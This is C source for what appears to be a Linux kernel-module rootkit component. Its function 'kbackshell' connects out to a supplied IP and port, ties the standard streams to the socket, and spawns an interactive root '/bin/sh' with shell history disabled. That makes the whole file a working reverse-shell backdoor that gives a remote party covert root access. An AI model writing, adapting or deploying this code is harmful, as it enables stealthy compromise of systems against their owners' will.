#include <net/sock.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include "g_types.h"
#include "syscalltable.h"

int kbackshell(u32_t ip, u16_t port)
{
	struct sockaddr_in __user s;
	int fd = 0, i = 0;
	char __user *cmd[] = {"-i", NULL};
	char __user *env[] =
	{
		"PATH=/bin:/usr/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/local/sbin:/usr/sfw/bin:/usr/ccs/bin",
		"USER=root", "HOME=/root", "HISTFILESIZE=0", "HISTSIZE=0",
		 NULL
	};
	
	s.sin_family = AF_INET;
	s.sin_port = htons(port);
	s.sin_addr.s_addr = ip;
	
	fd = g_sys_socket(AF_INET, SOCK_STREAM, 0);
	if(g_sys_connect(fd, (struct sockaddr *)&s, sizeof(struct sockaddr_in)) < 0)
	{
		sys_close(fd);
		return printk(KERN_ALERT "connect error.\n");
	}
	for(i = 0;i < 3;i ++) g_sys_dup2(fd, i);
	//call_usermodehelper("/home/ylbhz/lkm_hello/findfd", cmd, env, UMH_WAIT_EXEC);
	call_usermodehelper("/bin/sh", cmd, env, UMH_WAIT_EXEC);
	sys_close(fd);
	for(i = 0;i < 3;i ++) sys_close(i);
	
	return 0;
}
